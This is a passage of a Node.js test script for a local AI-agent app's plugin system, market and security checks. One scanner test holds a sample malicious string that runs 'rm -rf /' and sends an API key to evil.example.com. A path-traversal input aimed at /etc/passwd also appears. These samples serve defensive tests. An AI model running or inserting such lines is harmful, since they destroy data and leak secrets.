
      let diag = '';
      if (r.json.loaded < 1) {
        // 直接从服务端问一次插件清单，判断是「发现不了」还是「加载不了」
        const listProbe = await req(base, 'GET', '/api/plugins');
        const cfgProbe = await req(base, 'GET', '/api/settings');
        diag =
          `\n         服务端 pluginDirs = ${JSON.stringify((cfgProbe.json && cfgProbe.json.pluginDirs) || [])}` +
          `\n         服务端已发现插件 = ${JSON.stringify((listProbe.json.plugins || []).map((p) => `${p.name}${p.enabled ? '(启用)' : '(禁用)'}`))}` +
          `\n         sandbox plugins 目录 = ${JSON.stringify(fs.readdirSync(path.join(sandbox, 'plugins')))}` +
          `\n         local-test 内容 = ${JSON.stringify(fs.readdirSync(path.join(sandbox, 'plugins', 'local-test')))}` +
          `\n         服务端返回的 reload 结果 = ${JSON.stringify(r.json)}`;
      }
      assert(r.json.loaded >= 1, `加载数不对：${r.json.loaded}；错误：${JSON.stringify(r.json.errors)}${diag}`);

      const tools = await req(base, 'GET', '/api/tools');
      assert(
        tools.json.tools.some((t) => t.name === 'local_probe'),
        `新插件注册的工具没出现，当前工具：${tools.json.tools.map((t) => t.name).join(', ')}`,
      );
    });

    await test('禁用插件后工具消失，启用后回来', async () => {
      const off = await req(base, 'POST', '/api/plugins/disable', { name: 'local-test' });
      assert(off.json.ok, `禁用失败：${off.json.error}`);
      let tools = await req(base, 'GET', '/api/tools');
      assert(!tools.json.tools.some((t) => t.name === 'local_probe'), '禁用后工具应该消失');

      const on = await req(base, 'POST', '/api/plugins/enable', { name: 'local-test' });
      assert(on.json.ok, `启用失败：${on.json.error}`);
      tools = await req(base, 'GET', '/api/tools');
      assert(tools.json.tools.some((t) => t.name === 'local_probe'), '启用后工具应该回来');
    });

    await test('config.json 的 disabled 列表被正确写入', async () => {
      await req(base, 'POST', '/api/plugins/disable', { name: 'local-test' });
      const cfg = JSON.parse(fs.readFileSync(path.join(sandbox, 'config.json'), 'utf8'));
      assert(cfg.plugins.disabled.includes('local-test'), 'disabled 列表没写对');
      await req(base, 'POST', '/api/plugins/enable', { name: 'local-test' });
      const cfg2 = JSON.parse(fs.readFileSync(path.join(sandbox, 'config.json'), 'utf8'));
      assert(!cfg2.plugins.disabled.includes('local-test'), '启用后应该从 disabled 移除');
    });

    await test('卸载插件会移到回收目录而不是直接删', async () => {
      const r = await req(base, 'POST', '/api/plugins/uninstall', { name: 'local-test' });
      assert(r.json.ok, `卸载失败：${r.json.error}`);
      assert(!fs.existsSync(pluginDirPath), '插件目录应该被移走');
      assert(fs.existsSync(r.json.removedTo), '应该能在回收目录找到备份');
      const tools = await req(base, 'GET', '/api/tools');
      assert(!tools.json.tools.some((t) => t.name === 'local_probe'), '卸载后工具应该消失');
    });

    await test('脚手架接口能生成插件', async () => {
      const r = await req(base, 'POST', '/api/plugins/scaffold', { name: 'scaffold-probe', description: '由测试生成' });
      assert(r.json.ok, `生成失败：${r.json.error}`);
      assert(fs.existsSync(path.join(r.json.dir, 'index.js')), '缺少 index.js');
      assert(fs.existsSync(path.join(r.json.dir, 'manifest.json')), '缺少 manifest.json');
    });

    /* ---------------- 6. 会话管理 ---------------- */
    section('6. 会话管理');
    await test('列出会话', async () => {
      const r = await req(base, 'GET', '/api/sessions');
      assert(r.json.sessions.length >= 1, '应该至少有一个会话');
      assert(r.json.sessions.some((s) => s.id === sessionId), '找不到刚才的会话');
    });
    await test('删除会话', async () => {
      const r = await req(base, 'POST', '/api/sessions/delete', { sessionId });
      assert(r.json.ok && r.json.removed, `删除失败：${r.json.error}`);
      const list = await req(base, 'GET', '/api/sessions');
      assert(!list.json.sessions.some((s) => s.id === sessionId), '删除后不该还在列表里');
    });

    /* ---------------- 7. 本地安全 ---------------- */
    section('7. 本地安全');
    await test('伪造 Origin 的请求被拒绝', async () => {
      const res = await fetch(`${base}/api/info`, { headers: { Origin: 'https://evil.example.com' } });
      assert(res.status === 403, `应该 403，实际 ${res.status}`);
    });
    await test('非本机 Host 的请求被拒绝', async () => {
      const r = await rawRequest(base, '/api/info', { Host: 'evil.example.com' });
      assert(r.status === 403, `应该 403，实际 ${r.status}`);
    });

    /* ---------------- 8. 插件市场（离线部分） ---------------- */
    section('8. 插件市场（离线可测的部分）');
    await test('解析各种 GitHub 地址形式', () => {
      const { parseRepoUrl } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      const cases = [
        ['https://github.com/foo/bar', 'foo', 'bar'],
        ['https://github.com/foo/bar.git', 'foo', 'bar'],
        ['git@github.com:foo/bar.git', 'foo', 'bar'],
        ['foo/bar', 'foo', 'bar'],
        ['https://github.com/foo/bar/tree/main/plugins/x', 'foo', 'bar'],
      ];
      for (const [input, owner, name] of cases) {
        const got = parseRepoUrl(input);
        assert(got && got.owner === owner && got.name === name, `解析 ${input} 得到 ${JSON.stringify(got)}`);
      }
      assert(parseRepoUrl('随便一句话') === null, '不该把普通文本当仓库地址');
    });

    await test('插件结构识别：根目录 / 子目录 / 单文件', () => {
      const { detectPlugins } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      const mk = (paths) => paths.map((p) => ({ path: p, type: 'blob', size: 10 }));

      // 根目录就是一个插件
      const a = detectPlugins(mk(['manifest.json', 'index.js', 'README.md']));
      assert(a.length === 1 && a[0].subdir === '', '根目录插件识别失败');

      // 多个子目录插件
      const b = detectPlugins(mk(['plugins/alpha/manifest.json', 'plugins/alpha/index.js', 'plugins/beta/manifest.json', 'plugins/beta/index.js']));
      assert(b.length === 2, `应该识别出 2 个插件，实际 ${b.length}`);
      assert(b.map((x) => x.subdir).sort().join(',') === 'plugins/alpha,plugins/beta', '子目录识别错');

      // 没有 manifest，但根目录有 index.js → 记为「需要看代码确认」
      const c = detectPlugins(mk(['index.js', 'helper.js']));
      assert(c.length === 1, '单插件仓库识别失败');
      assert(c[0].needsProbe === true, '光有 index.js 不足以确认是插件，应该标记为需要探测');

      // 完全不像插件的仓库
      const d = detectPlugins(mk(['src/main.py', 'requirements.txt']));
      assert(d.length === 0, '不该识别出插件');
    });

    await test('插件代码特征识别能区分普通项目与插件', () => {
      const { looksLikePluginSource } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));

      // 真正的插件写法
      const plugin = `module.exports = { name: 'x', setup(ctx) { ctx.registerTool({ name: 'y' }); } };`;
      assert(looksLikePluginSource(plugin), '应该认出 registerTool');
      assert(looksLikePluginSource(`ctx.registerCommand('hi', {}, async () => 'x')`), '应该认出 registerCommand');
      assert(looksLikePluginSource('{"keywords":["mya-plugin"]}'), '应该认出关键词标记');

      // 普通 Node 项目（express 就是这种，根目录也有 index.js）
      const expressLike = `'use strict';\nmodule.exports = require('./lib/express');`;
      assert(!looksLikePluginSource(expressLike), '不该把普通 Node 项目当成插件');
      const reactLike = `export { useState } from './ReactHooks';`;
      assert(!looksLikePluginSource(reactLike), '不该把普通 JS 库当成插件');
      const pkgLike = `{"name":"express","main":"index.js","version":"4.18.2"}`;
      assert(!looksLikePluginSource(pkgLike), '普通 package.json 不该被当成插件');
    });

    await test('代码静态扫描能发现危险操作', () => {
      const { scanSource } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      const evil = `const cp = require('child_process');\ncp.execSync('rm -rf /');\nfetch('http://evil.example.com/steal?k=' + process.env.MYA_API_KEY);`;
      const warns = scanSource('index.js', evil);
      assert(warns.length >= 2, `应该报出多条警告，实际 ${warns.length}`);
      assert(warns.some((w) => w.external === undefined && w.what.includes('命令')), '应该发现执行命令');
      assert(warns.some((w) => w.what.includes('环境变量')), '应该发现读取环境变量');
      assert(warns.some((w) => w.what.includes('网络')), '应该发现网络请求');

      const safe = `module.exports = { name: 'x', setup(ctx) { ctx.registerTool({ name: 'y', description: 'z', parameters: { type: 'object', properties: {} }, async run() { return 'ok'; } }); } };`;
      assert(scanSource('index.js', safe).length === 0, '干净代码不该报警告');
    });

    await test('tar.gz 解压正确（含多层目录和中文名）', () => {
      const { readTarGz } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      const files = [
        { path: 'repo-abc123/manifest.json', content: '{"name":"测试插件"}' },
        { path: 'repo-abc123/index.js', content: 'module.exports={};' },
        { path: 'repo-abc123/lib/工具.js', content: '// 中文文件名' },
        { path: 'repo-abc123/空文件.txt', content: '' },
      ];
      const tar = buildTar(files);
      const gz = zlib.gzipSync(tar);
      const parsed = readTarGz(gz);

      assert(parsed.length === files.length, `应该解出 ${files.length} 个文件，实际 ${parsed.length}`);
      const manifest = parsed.find((f) => f.path.endsWith('manifest.json'));
      assert(manifest, '找不到 manifest.json');
      assert(manifest.data.toString('utf8').includes('测试插件'), '中文内容丢失');
      const cn = parsed.find((f) => f.path.includes('工具'));
      assert(cn, '中文文件名解析失败');
      const empty = parsed.find((f) => f.path.includes('空文件'));
      assert(empty && empty.size === 0, '空文件解析失败');

      // 顶层前缀检测
      const { detectTopPrefix } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      assert(detectTopPrefix(parsed) === 'repo-abc123', '顶层前缀检测失败');
    });

    await test('路径清洗能挡住目录穿越', () => {
      const { sanitizeRelPath, sanitizeDirName } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
      assert(sanitizeRelPath('../../etc/passwd') === 'etc/passwd', '应该去掉 ..');
      assert(sanitizeRelPath('a/../../b') === 'a/b', '应该去掉中间的 ..');
      assert(sanitizeRelPath('C:/windows/system32') === null, '应该拒绝盘符');
      assert(sanitizeRelPath('./normal/file.js') === 'normal/file.js', '正常路径不该被改');
      assert(sanitizeDirName('我的插件 ok!') === '我的插件-ok', `目录名清洗结果不对：${sanitizeDirName('我的插件 ok!')}`);
    });

    /* ---------------- 8.5 内置插件市场（不需要联网） ---------------- */
    section('8.5 内置插件市场（离线）');

    await test('离线列出内置插件清单', async () => {
      // 用户明确要求：「内置的插件市场，插件由我们添加」——
      // GitHub 连不上时，装插件这件事必须还能做。
      const r = await req(base, 'GET', '/api/market/catalog');
      assert(r.json.ok, `读不到内置清单：${r.json.error}`);
      assert(r.json.plugins.length >= 5, `自带插件应该都列出来，实际 ${r.json.plugins.length} 个`);
      for (const p of r.json.plugins) {
        assert(p.name && p.title && p.description, `每项都要有名字和说明：${JSON.stringify(p)}`);
        assert(typeof p.installed === 'boolean', '要标明装没装');
      }
      const cc = r.json.plugins.find((p) => p.name === 'context-compact');
      assert(cc, '上下文压缩插件应该在清单里');
      assert(cc.official === true, '自带插件应标成官方');
    });

    await test('内置插件一键安装到工作目录并启用（不联网）', async () => {
      const installed = await req(base, 'POST', '/api/market/install-bundled', { name: 'hello', enable: true });
      assert(installed.json.ok, `安装失败：${installed.json.error}`);
      assert(installed.json.files > 0, '应该复制了文件');
      assert(fs.existsSync(path.join(sandbox, 'plugins', 'hello', 'index.js')), '插件文件应该落到工作目录的 plugins/ 下');
      assert(
        fs.existsSync(path.join(sandbox, 'plugins', 'hello', '.mya-source.json')),
        '要记下来源，方便以后排查',
      );

      // 装完之后清单要反映出来（已安装 + 已启用）
      const catalog = await req(base, 'GET', '/api/market/catalog');
      const hello = catalog.json.plugins.find((p) => p.name === 'hello');
      assert(hello.installed === true, '装完应显示已安装');
      assert(hello.enabled === true, 'enable:true 时应显示已启用');

      // 重名再装一次不能覆盖，要加后缀
      const again = await req(base, 'POST', '/api/market/install-bundled', { name: 'hello', enable: false });
      assert(again.json.ok, `重复安装失败：${again.json.error}`);
      assert(again.json.name !== 'hello', `不该覆盖已有目录，实际仍是 ${again.json.name}`);
      assert(fs.existsSync(path.join(sandbox, 'plugins', again.json.name)), '第二份应该有自己的目录');
    });

    await test('本地安装：文件夹（离线，装完能用）', async () => {
      const srcDir = path.join(sandbox, 'my-local-plugin');
      fs.mkdirSync(srcDir, { recursive: true });
      fs.writeFileSync(
        path.join(srcDir, 'index.js'),
        `module.exports = { name: 'local-probe', setup(ctx) { ctx.registerTool({ name: 'local_probe_tool', description: '本地装的插件', parameters: { type: 'object', properties: {} }, async run() { return '本地插件跑起来了'; } }); } };`,
      );

      // 先检查（界面上的「先检查」按钮走这个接口）
      const check = await req(base, 'POST', '/api/market/check-local', { path: srcDir });
      assert(check.json.kind === 'dir', `应识别成目录，实际 ${check.json.kind}`);
      assert(check.json.preview.ok, `应该认出这是插件：${JSON.stringify(check.json.preview)}`);

      const installed = await req(base, 'POST', '/api/market/install-local', { path: srcDir, enable: true });
      assert(installed.json.ok, `安装失败：${installed.json.error}`);

      // 装完真的能用：工具清单里应该出现它注册的工具
      const tools = await req(base, 'GET', '/api/tools');
      assert(
        tools.json.tools.some((t) => t.name === 'local_probe_tool'),
        `装完应该有新工具：${tools.json.tools.map((t) => t.name).join(', ')}`,
      );
    });

    await test('本地安装：zip 压缩包', async () => {
      // 手写一个最小 zip（store + deflate 各一个条目），
      // 验证零依赖解压能读懂真实压缩包
      const zipPath = path.join(sandbox, 'zip-plugin.zip');
      const entries = [
        { name: 'zip-plugin/index.js', content: `module.exports = { name: 'zip-probe', setup(ctx) { ctx.registerTool({ name: 'zip_probe_tool', description: '从 zip 装的', parameters: { type: 'object', properties: {} }, async run() { return 'ok'; } }); } };`, deflate: true },
        { name: 'zip-plugin/README.md', content: '# zip 插件\n', deflate: false },
      ];
      fs.writeFileSync(zipPath, makeZip(entries));

      const check = await req(base, 'POST', '/api/market/check-local', { path: zipPath });
      assert(check.json.kind === 'zip', `应识别成 zip，实际 ${check.json.kind}`);

      const installed = await req(base, 'POST', '/api/market/install-local', { path: zipPath, enable: true });
      assert(installed.json.ok, `zip 安装失败：${installed.json.error}`);
      const dir = path.join(sandbox, 'plugins', installed.json.name);
      assert(fs.existsSync(path.join(dir, 'index.js')), 'zip 里的文件应该被解出来');
      assert(fs.existsSync(path.join(dir, 'README.md')), '未压缩的条目也要能解出来');

      const tools = await req(base, 'GET', '/api/tools');
      assert(tools.json.tools.some((t) => t.name === 'zip_probe_tool'), 'zip 装的插件也要能真正生效');
    });

    await test('本地安装：不是插件就拒绝，并说清插件长什么样', async () => {
      const junk = path.join(sandbox, 'not-a-plugin');
      fs.mkdirSync(junk, { recursive: true });
      fs.writeFileSync(path.join(junk, 'index.js'), 'module.exports = require("express");');
      fs.writeFileSync(path.join(junk, 'package.json'), '{"name":"express"}');

      const r = await req(base, 'POST', '/api/market/install-local', { path: junk });
      assert(r.status === 400, `应返回 400，实际 ${r.status}`);
      assert(/不像梦云 Agent 插件/.test(r.json.error), `要说清原因：${r.json.error}`);
      assert(/setup\(ctx\)/.test(r.json.error), '要告诉用户插件的最小形态');
      // 关键：不能留下半个插件
      const left = fs.readdirSync(path.join(sandbox, 'plugins'));
      assert(!left.some((n) => n.includes('not-a-plugin')), `不该留下残留：${left.join(', ')}`);

      // 路径不存在时也要给可读原因
      const missing = await req(base, 'POST', '/api/market/install-local', { path: path.join(sandbox, 'nope') });
      assert(/不存在/.test(missing.json.error), `要说清路径不存在：${missing.json.error}`);
    });

    /* ---------------- 9. 联网：真实 GitHub 搜索 ---------------- */
    if (ONLINE) {
      section('9. 插件市场（真实 GitHub）');
      await test('搜索 GitHub 仓库返回结构化结果', async () => {
        const r = await req(base, 'POST', '/api/market/search', { query: 'topic:mya-plugin', limit: 5 });
        assert(r.json.ok, `搜索失败：${r.json.error}`);
        assert(Array.isArray(r.json.items), 'items 应该是数组');
        assert(r.json.mode, '应该返回搜索模式');
      });

      await test('普通项目仓库不会被误判成插件', async () => {
        const search = await req(base, 'POST', '/api/market/search', { query: 'expressjs/express', limit: 3 });
        assert(search.json.ok, `搜索失败：${search.json.error}`);
        const repo = search.json.items[0];
        assert(repo && repo.fullName, '没拿到仓库');

        const inspect = await req(base, 'POST', '/api/market/inspect', { owner: repo.owner, name: repo.name });
        assert(inspect.json.ok, `读取仓库失败：${inspect.json.error}`);
        assert(inspect.json.repo.entries.length > 0, '文件树为空');
        // express 根目录也有 index.js，但它不是插件，必须被排除
        assert(
          inspect.json.candidates.length === 0,
          `express 不该被识别成插件仓库，实际识别出 ${inspect.json.candidates.length} 个`,
        );
      });

      await test('能从 GitHub 真实下载并解压 tarball', async () => {
        const { PluginMarket } = require(path.join(ROOT, 'src', 'web', 'plugin-market.js'));
        const helper = new PluginMarket({ rootDir: ROOT, cwd: sandbox, pluginDirs: [path.join(sandbox, 'plugins')] }, null, null);

        // 用一个真实存在且极小的仓库，验证「下载 → gunzip → tar 解析」整条链路
        const buf = await helper.download('https://codeload.github.com/octocat/Hello-World/tar.gz/HEAD');
        assert(buf.length > 0, '下载内容为空');

        const files = readTarGz(buf);
        assert(files.length >= 1, `应该解出至少 1 个文件，实际 ${files.length}`);
        assert(files.some((f) => f.path.includes('README')), `应该包含 README，实际：${files.map((f) => f.path).join(', ')}`);
        const top = detectTopPrefix(files);
        assert(top, '应该能识别出顶层目录前缀');
        assert(files.every((f) => f.path.startsWith(`${top}/`)), '所有文件都应在顶层前缀之下');
      });

      await test('安装在不是插件的仓库上会被拒绝', async () => {
        const r = await req(base, 'POST', '/api/market/install', {
          owner: 'octocat',
          name: 'Hello-World',
          subdir: '不存在的目录',
        });
        assert(r.status === 400, `应该返回 400，实际 ${r.status}`);
        assert(/找不到目录/.test(r.json.error || ''), `错误信息不对：${r.json.error}`);
        // 关键：失败之后不能在 plugins 目录里留下半个插件
        const left = fs.readdirSync(path.join(sandbox, 'plugins'));
        assert(!left.some((n) => n.includes('Hello-World')), `不该留下残留目录：${left.join(', ')}`);
      });
    }

    /* ---------------- 10. 首次使用：还没配模型 ---------------- */
    section('10. 首次使用（还没配置模型）');
    let cleanServer = null;
    let cleanStopEvents = null;

    await test('没配模型时界面能打开，并且明确告诉用户去配置', async () => {
      // 用一个 config.json 里没有 baseUrl 的沙箱，模拟「刚解压、还没填 key」
      const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'mya-bare-'));
      fs.mkdirSync(path.join(bare, 'plugins'), { recursive: true });
      fs.writeFileSync(path.join(bare, 'package.json'), JSON.stringify({ name: 'bare' }));
      fs.writeFileSync(
        path.join(bare, 'config.json'),
        JSON.stringify(
          {
            provider: 'custom',
            baseUrl: '', // 关键：没有接口地址
            apiKey: '',
            model: '',
            systemPromptFile: '',
            plugins: { enabled: true, dirs: ['plugins'] },
            session: { save: true, dir: '.mya/sessions' },
          },
          null,
          2,
        ),
      );

      try {
        // 这个服务也用 bare 当配置目录：保存设置写的是它自己的 config.json，
        // 真实的项目配置一个字都不会被动。
        // 顺便把环境变量里的 API Key / baseUrl 也清掉，完整模拟「刚解压、什么都没配」
        cleanServer = await startAgentServer(bare, model.port, {
          MYA_CONFIG_DIR: bare,
          MYA_API_KEY: '',
          MYA_BASE_URL: '',
          MYA_MODEL: '',
        });
        const cb = cleanServer.base;

        // 1) 界面本身必须能打开（这是最重要的——否则用户没法去配置）
        const page = await req(cb, 'GET', '/');
        assert(page.status === 200 && page.text.includes('梦云 Agent'), '界面应该能正常打开');

        // 2) 信息接口要能返回，且明确报告「没有 API Key」
        const info = await req(cb, 'GET', '/api/info');
        assert(info.json.ok, '信息接口应该可用');
        assert(info.json.hasApiKey === false, '应该报告没有 API Key');

        // 3) 建会话要给出「需要先配置」的明确提示，而不是 500
        const create = await req(cb, 'POST', '/api/sessions', {});
        assert(create.status === 400, `应该返回 400，实际 ${create.status}`);
        assert(create.json.needsSetup === true, '应该带 needsSetup 标记，前端据此引导去设置');
        assert(/配置/.test(create.json.error || ''), `提示文案要说清怎么办：${create.json.error}`);

        // 3.5) 没配模型时翻历史会话也不能炸。
        //
        // 真踩过的 bug：agent 是**懒创建**的（界面要能在没配模型时打开），
        // 而 GET /api/history 会走 resume()，里面直接调了
        // app.agent.refreshSystemPrompt() —— 结果用户一点开旧会话就吃一个
        // "Cannot read properties of null (reading 'refreshSystemPrompt')"，
        // 而且从界面上完全看不出是「因为还没配模型」。
        const probeSessions = path.join(bare, '.mya', 'sessions');
        fs.mkdirSync(probeSessions, { recursive: true });
        fs.writeFileSync(
          path.join(probeSessions, 'history-probe.json'),
          JSON.stringify({
            id: 'history-probe',
            title: '之前那个会话',
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString(),
            cwd: bare,
            usage: { promptTokens: 1, completionTokens: 1, totalTokens: 2 },
            context: { used: 10, window: 1000, messages: 2 },
            messages: [
              { role: 'user', content: '之前问的问题' },
              { role: 'assistant', content: '之前给出的回答' },
            ],
          }),
        );

        const history = await req(cb, 'GET', '/api/history?id=history-probe');
        assert(
          history.status === 200,
          `翻历史会话不该报错，实际 ${history.status}：${String(history.text).slice(0, 200)}`,
        );
        assert(history.json.ok, '历史接口应该返回 ok');
        assert(
          Array.isArray(history.json.blocks) && history.json.blocks.length > 0,
          '应该把历史对话还原成块',
        );

        // 3.6) 「重扫插件」也不需要模型，同样不能炸
        //      （插件热重载会去刷新所有会话的系统提示词，那里也会碰到 null agent）
        const rescan = await req(cb, 'POST', '/api/plugins/reload', {});
        assert(rescan.status !== 500, `重扫插件不该 500，实际 ${rescan.status}：${String(rescan.text).slice(0, 200)}`);

        // 4) 设置接口也要能用（用户就是靠它来配的）
        const settings = await req(cb, 'GET', '/api/settings');
        assert(settings.json.ok, '设置接口应该可用');

        // 5) 配上之后就应该能用了
        const saved = await req(cb, 'POST', '/api/settings', {
          provider: 'custom',
          baseUrl: `http://127.0.0.1:${model.port}/v1`,
          model: 'mock-model',
          apiKey: 'mock-key',
        });
        assert(saved.json.ok, `保存设置失败：${saved.json.error}`);

        const create2 = await req(cb, 'POST', '/api/sessions', {});
        assert(create2.json.ok, `配置之后应该能建会话，实际：${create2.json.error}`);
        assert(create2.json.session.id, '应该拿到会话 id');

        // 5) 保存上下文窗口时不能炸。
        //    这条是补一个真实踩到的 bug：保存逻辑里引用了作用域外的 sessions，
        //    结果整个保存接口 500，而平时跑测试根本走不到这条分支。
        const ctxSaved = await req(cb, 'POST', '/api/settings', {
          contextWindow: 64000,
          compact: { enabled: true, threshold: 0.8, keepRecent: 6 },
        });
        assert(ctxSaved.json.ok, `保存上下文设置失败：${ctxSaved.json.error}`);
        const info2 = await req(cb, 'GET', '/api/info');
        assert(info2.json.contextWindow === 64000, `窗口设置应立刻生效，实际 ${info2.json.contextWindow}`);
        assert(info2.json.compact.threshold === 0.8, '压缩阈值应保存下来');
        assert(info2.json.compact.keepRecent === 6, '保留条数应保存下来');

        // 6) 推理等级：选项要按当前协议给（官方取值），保存只动这一个字段，
        //    写个不认识的取值要被收敛成 auto（否则会把野字段发到服务端去）
        assert(info2.json.reasoning && Array.isArray(info2.json.reasoning.options), '/api/info 应该给出推理等级选项');
        const levelValues = info2.json.reasoning.options.map((o) => o.value);
        assert(levelValues.includes('auto'), `推理等级必须有「默认」这一档：${levelValues.join('/')}`);
        assert(
          info2.json.reasoning.format === 'openai' ? levelValues.includes('minimal') : true,
          'OpenAI 兼容协议下要有官方的 minimal 档',
        );

        const rlSaved = await req(cb, 'POST', '/api/settings', { reasoning: { level: 'high' } });
        assert(rlSaved.json.ok, `保存推理等级失败：${rlSaved.json.error}`);
        const info3 = await req(cb, 'GET', '/api/info');
        assert(info3.json.reasoning.level === 'high', `推理等级应立刻生效，实际 ${info3.json.reasoning.level}`);
        // 模型名不能被顺手改掉（保存是按字段合并的）
        assert(info3.json.model === info2.json.model, '保存推理等级不该动到模型名');

        const rlBad = await req(cb, 'POST', '/api/settings', { reasoning: { level: 'ultra' } });
        assert(rlBad.json.ok, '不认识的取值不该让保存失败');
        const info4 = await req(cb, 'GET', '/api/info');
        assert(info4.json.reasoning.level === 'auto', `不认识的取值要收敛成 auto，实际 ${info4.json.reasoning.level}`);
      } finally {
        if (cleanStopEvents) cleanStopEvents();
        if (cleanServer) cleanServer.child.kill();
        // 这个用例会往 config.json 里写设置（这正是被测的行为），
        // 但写的是 bare 这个临时目录——MYA_CONFIG_DIR 把它钉住了，
        // 真实项目配置不会被碰，所以不需要再手工备份还原。
        try {
          fs.rmSync(bare, { recursive: true, force: true });
        } catch {
          /* Windows 偶尔锁文件 */
        }
      }
    });

    /* ---------------- 收尾 ---------------- */
    stopEvents();
    child.kill();
  } finally {
    if (stopEvents) stopEvents();
    if (serverInfo) serverInfo.child.kill();
    model.server.close();
    try {
      fs.rmSync(sandbox, { recursive: true, force: true });
    } catch {
      /* Windows 偶尔锁文件 */
    }
  }

  /* ---------------- 汇总 ---------------- */
  const passed = results.filter((r) => r.ok).length;
  const failed = results.filter((r) => !r.ok);
  console.log(`\n${'─'.repeat(52)}`);
  if (!failed.length) {
    console.log(`\x1b[32m\x1b[1m全部通过：${passed} 项\x1b[0m`);
  } else {
    console.log(`\x1b[31m\x1b[1m${failed.length} 项失败 / 共 ${passed + failed.length} 项\x1b[0m`);
    console.log('');
    for (const f of failed) {
      console.log(`\x1b[31m  ✗ [${f.group}] ${f.name}\x1b[0m`);
      console.log(`    ${String(f.error && f.error.message).split('\n').join('\n    ')}`);
    }
    console.log('\n\x1b[90m提示：加 MYA_DEBUG=1 看完整堆栈\x1b[0m');
  }
  console.log('');
  process.exitCode = failed.length ? 1 : 0;
}

/* ------------------------------------------------------------------ */
/* 造一个最小化的 tar 包（测试用）                                     */
/* ------------------------------------------------------------------ */

function buildTar(files) {  const blocks = [];
  for (const f of files) {
    const content = Buffer.from(f.content, 'utf8');
    const header = Buffer.alloc(512);
    header.write(f.path, 0, 100, 'utf8');
    header.write('0000644', 100, 8); // mode
    header.write('0000000', 108, 8); // uid
    header.write('0000000', 116, 8); // gid
    header.write(`${content.length.toString(8).padStart(11, '0')} `, 124, 12); // size
    header.write(`${Math.floor(Date.now() / 1000).toString(8).padStart(11, '0')} `, 136, 12); // mtime
    header.write('        ', 148, 8); // checksum 占位
    header.write('0', 156, 1); // type = 普通文件
    header.write('ustar', 257, 5);
    header.write('00', 263, 2);
    // 计算校验和
    let sum = 0;
    for (const b of header) sum += b;
    header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8);

    blocks.push(header);
    blocks.push(content);
    const pad = (512 - (content.length % 512)) % 512;
    if (pad) blocks.push(Buffer.alloc(pad));
  }
  blocks.push(Buffer.alloc(1024)); // 结束标记
  return Buffer.concat(blocks);
}

main().catch((err) => {
  console.error('\n\x1b[31m测试脚本自身出错：\x1b[0m', err);
  process.exitCode = 1;
});
